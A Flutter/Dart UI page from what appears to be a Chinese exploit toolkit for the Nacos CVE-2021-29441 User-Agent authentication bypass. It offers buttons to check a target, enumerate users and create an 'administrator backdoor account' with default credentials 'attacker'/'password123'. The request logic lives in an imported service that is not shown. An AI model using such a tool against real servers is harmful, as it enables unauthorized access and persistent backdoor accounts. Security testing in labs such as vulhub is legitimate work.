import 'package:flutter/material.dart';

import '../../app/constants.dart';
import '../../exp/vulhub/misc_http_exp_service.dart';
import '_vulhub_page_helpers.dart';
import 'base_vulhub_exp_page.dart';

class NacosExpPage extends BaseVulhubExpPage {
  const NacosExpPage({super.key});

  @override
  State<NacosExpPage> createState() => _NacosPageState();
}

class _NacosPageState extends BaseVulhubExpPageState<NacosExpPage> {
  @override
  IconData get pageIcon => Icons.cloud;

  @override
  String get appBarTitle => 'Nacos CVE-2021-29441 User-Agent 认证绕过';

  @override
  String get cardTitle => 'Nacos CVE-2021-29441';

  @override
  String get cardSubtitle => 'User-Agent: Nacos-Server 绕过认证，枚举/创建用户（< 1.4.1）';

  final _urlCtrl = TextEditingController();
  final _userCtrl = TextEditingController(text: 'attacker');
  final _passCtrl = TextEditingController(text: 'password123');
  final _timeoutCtrl = TextEditingController();

  NacosExpService _svc() => NacosExpService(
        baseUrl: _urlCtrl.text.trim(),
        timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
      );

  Future<void> _check() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 检测 CVE-2021-29441 认证绕过...');
    try {
      final r = await _svc().check();
      appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到漏洞');
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _listUsers() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 枚举用户列表...');
    try {
      final out = await _svc().listUsers();
      appendLog(out != null && out.isNotEmpty ? '[+] 用户列表:\n$out' : '[-] 未获取到用户列表');
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _createUser() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    final user = _userCtrl.text.trim(); final pass = _passCtrl.text.trim();
    if (user.isEmpty || pass.isEmpty) {
      appendLog('[!] 请输入用户名和密码');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 创建用户: $user');
    try {
      final out = await _svc().createUser(user, pass);
      appendLog(out != null ? '[+] 响应: $out' : '[-] 创建失败');
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  @override
  void dispose() {
    _urlCtrl.dispose();
    _userCtrl.dispose();
    _passCtrl.dispose();
    _timeoutCtrl.dispose();
    super.dispose();
  }

  @override
  Widget buildLeftPanel(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          vSecTitle('目标配置'),
          vTf(_urlCtrl, '目标 URL', 'http://localhost:8080'),
          const SizedBox(height: 8),
          vTf(
            _timeoutCtrl,
            '超时(s)',
            '${AppConstants.defaultHttpTimeoutSeconds}',
            type: TextInputType.number,
          ),
          const SizedBox(height: 8),
          Row(
            children: [
              vBtn('检测漏洞', running ? null : _check),
              const SizedBox(width: 8),
              vBtn('枚举用户', running ? null : _listUsers),
            ],
          ),
          const SizedBox(height: 16),
          vSecTitle('创建管理员后门账号'),
          vTf(_userCtrl, '用户名', 'attacker'),
          const SizedBox(height: 8),
          vTf(_passCtrl, '密码', 'password123'),
          const SizedBox(height: 8),
          vBtn('创建用户', running ? null : _createUser),
        ],
      ),
    );
  }
}
